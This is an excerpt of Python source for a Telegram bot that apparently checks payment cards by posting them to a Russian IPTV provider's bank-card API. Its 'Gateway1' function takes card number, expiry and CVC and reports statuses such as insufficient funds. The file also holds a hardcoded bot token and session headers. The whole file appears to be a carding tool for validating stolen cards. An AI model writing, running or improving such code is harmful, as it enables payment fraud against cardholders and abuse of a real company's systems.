...
PREFIX = "/,!,?"
bot = Bot(
    token='5045877993:AAHAayx99PcIShH29mQWvr98cRaBWsCMw2U')
...
headers = {
    ...
    "session_id": "7f0d8c95-69b9-11ec-a3d9-0894efb6e800:51924639:49700777:2",
    "x-rt-uid": "",
    "x-rt-san": "",
}
...
async def Wink():
    while True:
        try:
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.post('https://cnt-brsk-itv02.svc.iptv.rt.ru/api/v2/portal/bank_cards') as r:
                    dataa = "order_id"
                #data = await r.json(
                    data = await r.json()
                    if dataa in data:
...
async def Gateway1(card, mm, yy, cvc, queue):
       # items = await Getcard()
        ...
        if "reqNote" in bind:
            bindd = bind['reqNote']
            try:
                result = (f""" <code>💳 {card}|{mm}|{yy}|{cvc}\n\nStatus: 🔴 Нету данной cуми на карте</code>""")
                queue.put(result)
